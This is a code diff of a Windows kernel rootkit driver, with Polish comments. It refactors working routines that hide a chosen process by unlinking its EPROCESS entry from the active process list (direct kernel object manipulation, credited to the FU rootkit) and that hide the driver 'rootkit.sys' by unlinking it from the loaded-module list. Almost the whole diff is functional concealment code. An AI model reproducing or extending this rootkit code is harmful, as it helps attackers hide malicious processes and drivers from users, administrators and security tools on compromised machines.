@@ -4,8 +4,8 @@
 #include "rk_DKOM.h"
 #include "rk_Tools.h"
 
+extern PMODULE_ENTRY	g_ModuleListBegin;
 extern NTOSKRNL_OFFSETS offsets;
-extern PMODULE_ENTRY	g_PsLoadedModuleList;  
 
 BOOLEAN OnProcessHide(IN ULONG pid) 
 {
@@ -20,11 +20,11 @@ BOOLEAN OnProcessHide(IN ULONG pid)
 
 	if (eproc == NULL ) {
 		DbgPrint("rootkit: Nie moge znalezc bloku EPROCESS\n");	 
-  	    LowerIRQLevel( tmpIrql );		
+  	    LowerIRQLevel( tmpIrql );
 		return FALSE;
 	}
 	
-	HideProcessFromProcessList( eproc );
+	DKOM_HideProcess( eproc );
 	
 	LowerIRQLevel( tmpIrql );
 
@@ -103,69 +103,62 @@ ULONG FindProcessEPROCByName(char procName[])
 	}
 }
 
-//unlink from ActiveProcessLinks list
-BOOLEAN HideProcessFromProcessList( PEPROCESS eproc )
+// kod bazuje na FU rootkit
+VOID DKOM_HideProcess( PEPROCESS eproces )
 {
 	PLIST_ENTRY plist_active_procs;
-	plist_active_procs = (PLIST_ENTRY)((ULONG)eproc + offsets.activeProcessListOffset);
+	plist_active_procs = (PLIST_ENTRY)((ULONG)eproces + offsets.activeProcessListOffset);
 
 	*( (ULONG*)plist_active_procs->Blink )  = (ULONG)plist_active_procs->Flink;
 	*( (ULONG*)plist_active_procs->Flink+1) = (ULONG)plist_active_procs->Blink;
-	//poprawiamy zakonczenia pozostalego procesu
+	
 	plist_active_procs->Flink = (LIST_ENTRY*)&(plist_active_procs->Flink);
 	plist_active_procs->Blink = (LIST_ENTRY*)&(plist_active_procs->Flink);
-	return TRUE;
 }
 
-BOOLEAN HideModule() 
+BOOLEAN HideRootkitModule() 
 {
-	PMODULE_ENTRY pm_current;
-	UNICODE_STRING driverToHide;
-	KIRQL	tmpIrql;
-	BOOLEAN	ret = FALSE;
+	UNICODE_STRING rootkitdriver;
+	PMODULE_ENTRY pHelper;	
+    BOOLEAN	 bFound;
 
 //	tmpIrql = RaiseIRQLevel();
 
-	RtlInitUnicodeString( &driverToHide, L"rootkit.sys" );
+    bFound = FALSE;
 
-	DbgPrint("rootkit: Chowam driver: %S\n",driverToHide.Buffer);
+	RtlInitUnicodeString( &rootkitdriver, L"rootkit.sys" );
+
+	DbgPrint("rootkit: Chowam driver: %S\n",rootkitdriver.Buffer);
 
 //	DbgPrint("g_PsLoadedModuleList: %x\n",g_PsLoadedModuleList);
 
-	pm_current = g_PsLoadedModuleList;//->le_mod.Flink;
+	pHelper = g_ModuleListBegin;
 
-	while ((PMODULE_ENTRY)pm_current->le_mod.Flink != g_PsLoadedModuleList ) {
-		if ( (pm_current->unk1 != 0x00000000) && (pm_current->driver_Path.Length!=0)) {
+	while ((PMODULE_ENTRY)pHelper->le_mod.Flink != g_ModuleListBegin ) {
+		if ( (pHelper->unk1 != 0x00000000) && (pHelper->driver_Path.Length!=0)) {
 			//porownujemy nazwy driverow
-			if (RtlCompareUnicodeString(&driverToHide, &(pm_current->driver_Name),FALSE ) ==0 ) {
+			if (RtlCompareUnicodeString(&rootkitdriver, &(pHelper->driver_Name),FALSE ) == 0 ) {
 				//zminieniamy sasiadow
-				*((PULONG)pm_current->le_mod.Blink) = (ULONG)pm_current->le_mod.Flink;
-				pm_current->le_mod.Flink->Blink = pm_current->le_mod.Blink;
-				ret = TRUE;
-				goto gt_leave;
+				*((PULONG)pHelper->le_mod.Blink) = (ULONG)pHelper->le_mod.Flink;
+				pHelper->le_mod.Flink->Blink = pHelper->le_mod.Blink;
+				return TRUE;
 			}
 		}
-		pm_current = (PMODULE_ENTRY)pm_current->le_mod.Flink;
+		pHelper = (PMODULE_ENTRY)pHelper->le_mod.Flink;
 	}
 
-gt_leave:
-//	LowerIRQLevel( tmpIrql );
-
-	return ret;
+    return FALSE;
 }
 
-ULONG FindPsLoadedModuleList (IN PDRIVER_OBJECT  DriverObject)
+ULONG GetModuleListBegin (PDRIVER_OBJECT  DriverObject)
 {
-	PMODULE_ENTRY pm_current;
+	PMODULE_ENTRY pHelper;
 
-	if (DriverObject == NULL)
-		return 0;
-
-	pm_current = *((PMODULE_ENTRY*)((ULONG)DriverObject + 0x14));
-	if (pm_current == NULL)
+	pHelper = *((PMODULE_ENTRY*)((ULONG)DriverObject + 0x14));
+	if (pHelper == NULL)
 		return 0;
 	
-	return (ULONG) pm_current;
+	return (ULONG) pHelper;
 }
 
 PMODULE_ENTRY FindModuleEntry(PMODULE_ENTRY pPsLoadedModuleList, PUNICODE_STRING usModuleName)
